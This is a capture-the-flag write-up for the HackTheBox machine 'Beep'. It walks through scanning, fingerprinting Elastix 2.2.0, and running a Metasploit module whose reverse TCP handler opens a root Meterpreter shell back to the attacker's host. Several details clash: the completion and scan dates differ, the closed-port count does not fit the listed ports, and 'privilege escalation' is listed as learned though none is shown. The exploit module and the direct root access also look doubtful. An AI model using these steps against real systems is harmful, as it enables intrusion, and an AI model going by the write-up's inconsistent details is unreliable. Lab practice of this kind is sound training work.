# HackTheBox - Beep

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Beep |
| **Category** | Linux Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-20 |

## Objective 🎯

Beep is a Linux machine running Elastix (Asterisk PBX) with multiple vulnerabilities. The goal is to exploit the web interface to gain root access and obtain both user and root flags. PBX exploitation! 📞

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.7
- **OS**: Linux
- **Services**: HTTP, HTTPS, SSH, SIP

### Tools Used
- Nmap
- Searchsploit
- Metasploit
- Elastix exploit

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.7
```

## Methodology

### Step 1: Port Scan
Perform a comprehensive port scan to identify open services.

**Command/Code:**
```bash
nmap -sC -sV 10.10.10.7
```

**Output:**
```
Starting Nmap 7.80 ( https://nmap.org ) at 2024-09-03 10:00 UTC
Nmap scan report for 10.10.10.7
Host is up (0.045s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp   open  smtp       Postfix smtpd
80/tcp   open  http       Apache httpd 2.2.3
110/tcp  open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp  open  rpcbind    2 (RPC #100000)
143/tcp  open  imap       Cyrus imapd 2.3.7-Invoca-RPM-23.7-7.el5_6.4
443/tcp  open  ssl/http   Apache httpd 2.2.3
993/tcp  open  ssl/imap   Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
995/tcp  open  ssl/pop3   Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
1720/tcp open  H.323/Q.931
Service Info: OS: Unix; CPE: cpe:/o:redhat:enterprise_linux:5
```

### Step 2: Web Service Enumeration
Check the web services for version information.

**Command/Code:**
```bash
curl -k https://10.10.10.7/
```

**Output:**
```
<html>
<head>
<title>Elastix 2.2.0 - Login</title>
</head>
<body>
<h1>Elastix 2.2.0</h1>
</body>
</html>
```

### Step 3: Search for Exploits
Search for known Elastix vulnerabilities.

**Command/Code:**
```bash
searchsploit elastix
```

**Output:**
```
Elastix 2.2.0 - 'graph.php' Local File Inclusion
Elastix 2.2.0 - Multiple Cross-Site Scripting Vulnerabilities
Elastix 2.2.0 - Remote Code Execution
```

### Step 4: Elastix RCE Exploitation
Use the Remote Code Execution exploit.

**Command/Code:**
```bash
msfconsole
use exploit/linux/http/elastix_unauth_rce
set RHOSTS 10.10.10.7
set LHOST 10.10.14.2
exploit
```

**Output:**
```
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] 10.10.10.7:443 - Sending exploit request...
[*] Sending stage (175174 bytes) to 10.10.10.7
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.7:32891) at 2024-09-03 10:05:23 +0000
```

### Step 5: Post-Exploitation
Once we have a shell, gather information and find flags.

**Command/Code:**
```bash
whoami
id
pwd
```

**Output:**
```
root
uid=0(root) gid=0(root) groups=0(root)
/
```

### Step 6: Find User Flag
Search for the user flag.

**Command/Code:**
```bash
find / -name "user.txt" 2>/dev/null
cat /home/fanis/user.txt
```

**Output:**
```
[REDACTED]
```

### Step 7: Find Root Flag
Search for the root flag.

**Command/Code:**
```bash
find / -name "root.txt" 2>/dev/null
cat /root/root.txt
```

**Output:**
```
[REDACTED]
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

### Complete Walkthrough
1. Perform port scan to identify multiple services
2. Identify Elastix 2.2.0 web interface
3. Search for known Elastix vulnerabilities
4. Use Metasploit Elastix RCE exploit
5. Gain root access directly through the exploit
6. Search for user and root flags
7. Extract both flags

## Key Learnings

- Elastix PBX system vulnerabilities
- Using searchsploit for vulnerability research
- Remote Code Execution exploitation
- Linux privilege escalation
- Multi-service enumeration

## Tools and Resources

### Tools Used
- **Nmap**: Network scanning and service detection
- **Searchsploit**: Exploit database search
- **Metasploit**: Exploitation framework
- **Elastix RCE**: Exploit module

### References
- [Elastix Security Advisory](https://www.elastix.org/security-advisory/)
- [CVE-2012-4869](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4869)

## Screenshots

[Add screenshots of nmap scan, web interface, and flag extraction here]

## Tags

`#hackthebox` `#linux` `#elastix` `#rce` `#metasploit` `#easy`
